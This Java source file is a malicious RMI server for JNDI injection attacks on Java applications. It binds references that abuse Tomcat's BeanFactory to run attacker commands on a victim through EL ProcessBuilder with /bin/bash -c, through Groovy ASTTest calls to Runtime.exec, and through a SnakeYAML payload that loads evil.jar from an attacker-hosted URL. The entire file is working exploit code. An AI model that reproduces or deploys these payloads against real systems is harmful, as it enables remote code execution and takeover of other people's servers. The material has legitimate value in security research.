package com.github.enokiy.deserialization;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.Registry;

public class HackerRMIRefServer {


    public static void main(String[] args) throws Exception {
        Registry registry = new MyRegistryImpl(Constants.rmiPort);

        System.out.println(Constants.rmiUrl + "execByEL");
        registry.bind("execByEL",execByEL());

        System.out.println(Constants.rmiUrl + "execByGroovyClassLoader");
        registry.bind("execByGroovyClassLoader",execByGroovyClassLoader());

        System.out.println(Constants.rmiUrl + "execByGroovyShell");
        registry.bind("execByGroovyShell",execByGroovyShell());

        System.out.println(Constants.rmiUrl + "execByYaml");
        registry.bind("execByYaml",execByYaml());

    }

    public static ReferenceWrapper execByLow(String remote_class_server) throws RemoteException, NamingException {

        Reference ref = new Reference("org.CommonRef", "org.CommonRef", remote_class_server);
        return new ReferenceWrapper(ref);
    }

    public static ReferenceWrapper execByEL() throws RemoteException, NamingException {
        String evalStr = String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','%s']).start()\")",new Object[]{Constants.cmd});
        // Exploit with JNDI Reference with local factory Class EL
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "enokiy=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("enokiy", evalStr));
        // Reference包装类
        return new ReferenceWrapper(ref);
    }


    public static ReferenceWrapper execByGroovyClassLoader() throws RemoteException, NamingException {
        // Exploit with JNDI Reference with local factory Class Groovy
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"%s\")})\n" +
                "def y",new Object[]{Constants.cmd});
        ref.add(new StringRefAddr("x",script));
        return new ReferenceWrapper(ref);
    }

//    groovy.lang.GroovyShell
public static ReferenceWrapper execByGroovyShell() throws RemoteException, NamingException {
    // Exploit with JNDI Reference with local factory Class Groovy
    ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
    ref.add(new StringRefAddr("forceString", "x=evaluate"));
    String script = String.format("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"%s\")})\n" +
            "def y",new Object[]{Constants.cmd});
    ref.add(new StringRefAddr("x",script));
    return new ReferenceWrapper(ref);
}

    public static ReferenceWrapper execByYaml() throws RemoteException, NamingException {
        // Exploit with JNDI Reference with local factory Class Groovy
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=load"));
        ref.add(new StringRefAddr("x",String.format("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"%sevil.jar\"]]]]",new Object[]{Constants.httpUrl})));
        return new ReferenceWrapper(ref);
    }
}
